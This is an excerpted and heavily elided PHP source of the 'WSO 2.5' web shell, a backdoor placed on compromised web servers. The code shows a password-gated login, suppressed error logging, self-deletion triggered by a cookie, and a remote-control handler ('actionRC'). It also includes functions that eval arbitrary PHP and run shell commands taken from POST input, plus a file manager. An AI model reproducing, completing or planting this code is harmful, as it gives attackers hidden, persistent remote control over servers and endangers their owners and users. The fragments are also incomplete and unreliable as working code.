...
if (!empty($_COOKIE['_sess'])) @unlink($_SERVER['SCRIPT_FILENAME']);
...
@define('SO_VERSION', '2.5');
@ini_set('log_errors', 0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if (get_magic_quotes_gpc()) {
    function SOstripslashes($array) {
        return is_array($array) ? array_map('SOstripslashes', $array) : stripslashes($array);
    }
    $_POST = SOstripslashes($_POST);
    $_COOKIE = SOstripslashes($_COOKIE);
}
function soLogin() {
    die("<pre align = 'center'>
<form method = 'post'>
Password: <input type = 'password' name = 'pass'><input type = 'submit' value = '->' >
</form>
</pre>");
}
function SOsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
if (!empty($hash)) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $hash)) SOsetcookie(md5($_SERVER['HTTP_HOST']), $hash);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $hash)) soLogin();
}
...
if($os == 'win')
    ...
    function soHeader() {
        ...
        global $color;
        echo "<html>
	<head> <meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'> <title>" . $_SERVER['HTTP_HOST'] . " - W S O " . SO_VERSION . "</title>
<link rel='icon' type='image/png' href='data:image/png;base64,dGVzdA==' />
<style>
...
<script>
	...
	var c_='" . htmlspecialchars($GLOBALS['cwd']) . "';var charset_='" . htmlspecialchars(@$_POST['charset']) . "';var p3_='" . ((strpos(@$_POST['p3'], "
") !== false) ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';var p2_='" . ((strpos(@$_POST['p2'], "
") !== false) ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';var a_='" . htmlspecialchars(@$_POST['a']) . "';var p1_='" . ((strpos(@$_POST['p1'], "
") !== false) ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';var d=document;
	function set (a, c, p1, p2, p3, charset) {
		if(p2!= null)d.mf.p2.value=p2; else d.mf.p2.value= p2_;
		if(c!= null)d.mf.c.value=c; else d.mf.c.value= c_;if(p1!= null)d.mf.p1.value=p1; else d.mf.p1.value= p1_;if(a!= null)d.mf.a.value=a; else d.mf.a.value= a_;
...
";
        ...
        if (!empty($GLOBALS['hash'])) $m['Logout'] = 'Logout';
...
";
                                        ...
                                        function actionPhp() {
                                            if (isset($_POST['ajax'])) {
                                                SOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
                                                ob_start();
                                                eval($_POST['p1']);
...
", $temp;
                                            ...
                                            if (empty($_POST['ajax']) && !empty($_POST['p1'])) SOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
                                            soHeader();
                                            ...
                                            echo '<h1>Execution PHP-code</h1><div class=content><form name="pf" method="post" onsubmit="if (this.ajax.checked){a (\'Php\', null, this.code.value);}else{g (\'Php\',null,this.code.value,\'\');}return false;"><textarea name="code" class="bigarea" id =PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea>
                                        ...
                                        function actionFilesMan() {
                                            ...
                                            if (!empty($_POST['p1'])) {
                                                switch ($_POST['p1']) {
                                                    ...
                                                    default:
                                                        if (!empty($_POST['p1'])) {
                                                            SOsetcookie('act', $_POST['p1']);
                                                            SOsetcookie('f', serialize(@$_POST['f']));
                                                            SOsetcookie('c', @$_POST['c']);
                                                        }
                                                        break;
                                                    }
                                                }
...
";
                                                ...
                                                function actionConsole() {
                                                    if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
                                                        SOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
                                                        $_POST['p1'].= ' 2>&1';
                                                    } elseif (!empty($_POST['p1'])) SOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0);
                                                    if (isset($_POST['ajax'])) {
                                                        SOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
                                                        ob_start();
                                                        echo "d.cf.cmd.value='';
			...
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
                                                            ...
                                                            function actionRC() {
                                                                if (!@$_POST['p1']) {
                                                                    $a = array("uname" => php_uname(), "php_version" => phpversion(), "wso_version" => SO_VERSION, "safemode" => @ini_get('safe_mode'));
                                                                    echo serialize($a);
                                                                } else {
                                                                    eval($_POST['p1']);
                                                                }
